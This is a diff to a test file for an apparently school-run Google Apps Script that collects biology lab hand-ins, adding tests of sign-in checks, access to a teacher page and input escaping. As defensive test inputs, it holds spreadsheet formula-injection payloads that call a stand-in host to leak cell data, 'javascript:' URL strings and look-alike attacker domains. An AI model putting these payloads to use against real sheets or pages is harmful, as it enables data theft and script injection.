@@ -195,11 +195,25 @@ global.LockService = { getScriptLock: () => ({ waitLock: () => true, releaseLock
 global.Logger = { log: m => log('log: ' + m) };
 global.Classroom = undefined;                    /* as it is before the service is added */
 global.TOKEN_EMAIL = 'ana@x.kr';
-global.UrlFetchApp = { fetch: () => ({ getResponseCode: () => 200,
-  getContentText: () => JSON.stringify({ aud: 'CID', exp: Math.floor(Date.now()/1000)+3600,
-                                         email_verified: 'true', email: TOKEN_EMAIL, name: 'A Person' }) }) };
+/* Every call to Google's token check is counted, so a test can prove junk never reaches it. */
+global.FETCHES = 0;
+global.TOKEN_ISS = 'https://accounts.google.com';
+global.UrlFetchApp = { fetch: () => { FETCHES++; return { getResponseCode: () => 200,
+  getContentText: () => JSON.stringify({ aud: 'CID', iss: TOKEN_ISS, exp: Math.floor(Date.now()/1000)+3600,
+                                         email_verified: 'true', email: TOKEN_EMAIL, name: 'A Person' }) }; } };
 global.Utilities = { base64EncodeWebSafe: b => 'b64' + String(b).length,
-                     computeDigest: (a, t) => String(t), DigestAlgorithm: { SHA_256: 1 } };
+                     computeDigest: (a, t) => String(t), DigestAlgorithm: { SHA_256: 1 },
+                     base64DecodeWebSafe: s => Buffer.from(String(s).replace(/-/g, '+').replace(/_/g, '/'), 'base64'),
+                     newBlob: bytes => ({ getDataAsString: () => Buffer.from(bytes).toString('utf8') }) };
+/* A sign-in shaped like Google's: three parts, the middle one naming this app and a time to come.
+   The script turns away anything that is not, before it spends a call on it. */
+global.jwt = (claims) => ['{"alg":"RS256"}', JSON.stringify(claims), 'sig']
+  .map((x, i) => i === 2 ? x : Buffer.from(x).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')).join('.');
+global.TOK = jwt({ aud: 'CID', exp: Math.floor(Date.now() / 1000) + 3600, email: 'ana@x.kr' });
+global.OWNER = 'teacher@x.kr';
+global.VISITOR = '';
+global.Session = { getEffectiveUser: () => ({ getEmail: () => OWNER }), getActiveUser: () => ({ getEmail: () => VISITOR }) };
+global.HtmlService.createHtmlOutput = (h) => { const o = { html: h, setTitle: () => o, addMetaTag: () => o }; return o; };
 
 eval(fs.readFileSync(process.argv[2] || 'apps-script/Code.gs', 'utf8'));
 
@@ -271,7 +285,7 @@ ok &= run('importing twice does not double anybody up', () => {
 console.log('— handing in —');
 CLIENT_ID = 'CID';
 const hand = (o) => String(doPost({ postData: { contents: JSON.stringify(Object.assign({
-  app: 'digestion-lab', name: 'Ana Lee', form: '9A', token: 'tok', complete: true,
+  app: 'digestion-lab', name: 'Ana Lee', form: '9A', token: TOK, complete: true,
   from: new Date(Date.now() - 3 * 864e5).toISOString(), stations: { mouth: '8/8 in 11' } }, o)) } }));
 /* However many questions the Digestion Lab actually asks. Hard-coding it meant every code
    test broke the day the real count was corrected, which looked like a bug in the script. */
@@ -357,7 +371,7 @@ ok &= run('a student with a broken code is quarantined, not marked', () => {
   if (anaRow()[2] !== best) throw new Error('a rejected hand-in still changed the mark');
 });
 ok &= run('a hand-in for a lab that does not exist is ignored', () => {
-  const out = String(doPost({ postData: { contents: JSON.stringify({ app: 'not-a-lab', score: 1, total: 1, token: 'tok' }) } }));
+  const out = String(doPost({ postData: { contents: JSON.stringify({ app: 'not-a-lab', score: 1, total: 1, token: TOK }) } }));
   if (!/unknown lab/.test(out)) throw new Error(out);
 });
 
@@ -884,6 +898,97 @@ ok &= run('a lab taken back out leaves its marks alone and says so', () => {
   if (h.indexOf('Brand New') >= 0) throw new Error('an empty column for a removed lab was left behind');
   if (h.indexOf('Old Topic 22') < 0) throw new Error('a column holding a mark was removed');
   if (!/Old Topic 22/.test(report)) throw new Error('it stopped naming what it kept: ' + report);
+});
+
+console.log('— signing in, safely —');
+ok &= run('junk and other apps\' sign-ins are turned away without asking Google', () => {
+  const before = FETCHES;
+  const say = (t) => String(doPost({ postData: { contents: JSON.stringify({ app: 'digestion-lab', token: t, score: 1, total: 1 }) } }));
+  const outs = [say('tok'), say('a.b.c'), say(jwt({ aud: 'SOMEBODY-ELSE', exp: Math.floor(Date.now() / 1000) + 3600 })),
+                say(jwt({ aud: 'CID', exp: Math.floor(Date.now() / 1000) - 10 }))];
+  outs.forEach(o => { if (o !== 'not recorded: not signed in') throw new Error('answered ' + o); });
+  if (FETCHES !== before) throw new Error((FETCHES - before) + ' call(s) to Google for junk');
+});
+ok &= run('a token Google does not stand behind is refused, and not asked about twice', () => {
+  const was = TOKEN_ISS; TOKEN_ISS = 'https://evil.example';
+  const t = jwt({ aud: 'CID', exp: Math.floor(Date.now() / 1000) + 3600, n: 1 });
+  const say = () => String(doPost({ postData: { contents: JSON.stringify({ app: 'digestion-lab', token: t, score: 1, total: 1 }) } }));
+  const before = FETCHES;
+  const a = say(), b = say();
+  TOKEN_ISS = was;
+  if (a !== 'not recorded: not signed in' || b !== a) throw new Error('answered ' + a + ' / ' + b);
+  if (FETCHES - before !== 1) throw new Error('asked Google ' + (FETCHES - before) + ' times');
+});
+ok &= run('nothing a page sends can become a formula in the sheet', () => {
+  const was = TOKEN_EMAIL; TOKEN_EMAIL = 'ana@x.kr';          /* an earlier test signed in as somebody else */
+  const code = _code('digestion-lab', 'Ana Lee', '9A', QN + '/' + QN);
+  ss.getSheetByName('Digestion').getRange(2, 3).setValue('');   /* so this hand-in beats her best, and every column is written */
+  hand({ score: QN, total: QN, code: code, snap: '=IMAGE("https://example.invalid/?"&A1)',
+         stations: { '=HYPERLINK("x")': '1/1' } });
+  const row = anaRow();
+  if (row[LAB_SNAP - 1] !== '\'=IMAGE("https://example.invalid/?"&A1)') throw new Error('snap stored as ' + row[LAB_SNAP - 1]);
+  if (!/^'=/.test(String(row[13]))) throw new Error('per-station stored as ' + row[13]);
+  hand({ score: 1, total: 1, code: '=IMPORTXML("https://example.invalid","//a")' });
+  const rj = ss.getSheetByName('Rejected');
+  const last = rj.getRange(rj.getLastRow(), 1, 1, 9).getValues()[0];
+  if (last[6] !== '\'=IMPORTXML("https://example.invalid","//a")') throw new Error('rejected code stored as ' + last[6]);
+  if (_plain('CL-ABCD-EFGH') !== 'CL-ABCD-EFGH' || _plain('ana~9:21') !== 'ana~9:21') throw new Error('ordinary text was changed');
+  TOKEN_EMAIL = was;
+});
+ok &= run('an error never shows a file id', () => {
+  const said = String(doPost({ postData: { contents: '{not json' } }));
+  if (!/^error: /.test(said)) throw new Error('said ' + said);
+  const redacted = 'error: ' + String('Exception: failed while accessing document with id 1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789').replace(/[A-Za-z0-9_-]{25,}/g, '…');
+  if (/1AbCdEfGh/.test(redacted)) throw new Error('id kept');
+});
+
+console.log('— school accounts and teachers —');
+ok &= run('pupils (a sub-domain) and staff are both the school\'s; look-alikes are not', () => {
+  const yes = ['a@x.kr', 'b@pupils.x.kr', 'c@deep.pupils.x.kr'], no = ['d@evilx.kr', 'e@x.kr.evil.com', 'f@gmail.com', 'nobody'];
+  yes.forEach(e => { if (!_inDomain(e, 'x.kr')) throw new Error(e + ' refused'); });
+  no.forEach(e => { if (_inDomain(e, 'x.kr')) throw new Error(e + ' accepted'); });
+  if (_inDomain('a@x.kr', '')) throw new Error('an empty domain accepted somebody');
+});
+ok &= run('a teacher is the owner, or on TEACHERS at the school\'s own domain — never a pupil', () => {
+  SCHOOL_DOMAIN = 'x.kr'; TEACHERS = 'colleague@x.kr, pupil@pupils.x.kr, outsider@gmail.com';
+  if (!_isTeacher(OWNER)) throw new Error('the owner is not a teacher');
+  if (!_isTeacher('Colleague@X.kr ')) throw new Error('a listed colleague is not');
+  if (_isTeacher('pupil@pupils.x.kr')) throw new Error('a pupil on the list became a teacher');
+  if (_isTeacher('outsider@gmail.com')) throw new Error('a personal account on the list became a teacher');
+  if (_isTeacher('other@x.kr')) throw new Error('an unlisted member of staff became a teacher');
+  TEACHERS = ''; if (!_isTeacher('colleague@x.kr')) throw new Error('an empty line forgot the saved list');
+  TEACHERS = 'none'; if (_isTeacher('colleague@x.kr') || !_isTeacher(OWNER)) throw new Error('"none" did not leave only the owner');
+  TEACHERS = ''; SCHOOL_DOMAIN = '';
+  props.delete('TEACHERS'); props.delete('SCHOOL_DOMAIN');
+});
+ok &= run('the teacher page address must be a web app, and points at the page', () => {
+  TEACHER_PAGE_URL = 'https://script.google.com/a/macros/x.kr/s/AKfyTEST/exec';
+  if (_teacherPageUrl() !== 'https://script.google.com/a/macros/x.kr/s/AKfyTEST/exec?page=teachers') throw new Error(_teacherPageUrl());
+  TEACHER_PAGE_URL = 'https://evil.example/exec'; if (_teacherPageUrl() !== '') throw new Error('accepted ' + _teacherPageUrl());
+  TEACHER_PAGE_URL = 'javascript:alert(1)//script.google.com/x/exec'; if (_teacherPageUrl() !== '') throw new Error('accepted javascript:');
+  TEACHER_PAGE_URL = ''; props.delete('TEACHER_PAGE_URL');
+});
+ok &= run('the teacher page shows nothing to nobody, to a pupil, or to unlisted staff', () => {
+  SCHOOL_DOMAIN = 'x.kr';
+  setUpTeacherPage.length;                      /* exists */
+  const tab = ss.insertSheet(T_LINKS);
+  tab.getRange(1, 1, 4, 4).setValues([['Section', 'Name', 'Link', 'Note'],
+    ['Reflection spreadsheets', 'Test <b>7</b>', 'https://docs.google.com/spreadsheets/d/SECRET-ID/edit', 'a "note" & more'],
+    ['Records', 'Bad link', 'javascript:alert(1)', ''],
+    ['Records', 'Not a link', 'docs.google.com/x', '']]);
+  const page = (who) => { VISITOR = who; return doGet({ parameter: { page: 'teachers' } }).html; };
+  [['', 'nobody'], ['pupil@pupils.x.kr', 'a pupil'], ['other@x.kr', 'unlisted staff']].forEach(([who, label]) => {
+    const h = page(who);
+    if (/SECRET-ID|docs\.google\.com|Test &lt;b&gt;7/.test(h)) throw new Error(label + ' was shown a link');
+  });
+  const h = page(OWNER);
+  if (!/SECRET-ID/.test(h)) throw new Error('the owner was not shown the link');
+  if (/<b>7<\/b>/.test(h) || !/Test &lt;b&gt;7&lt;\/b&gt;/.test(h)) throw new Error('a name was not escaped');
+  if (/javascript:/.test(h) || /Not a link/.test(h) || /Bad link/.test(h)) throw new Error('a non-https row was shown');
+  if (!/a &quot;note&quot; &amp; more/.test(h)) throw new Error('a note was not escaped');
+  if (String(doGet({ parameter: {} })) !== 'Biology Labs endpoint is running.') throw new Error('the health check changed');
+  VISITOR = ''; SCHOOL_DOMAIN = ''; props.delete('SCHOOL_DOMAIN');
+  ss.deleteSheet(tab);
 });
 
 const st = ss.getSheetByName('Students');
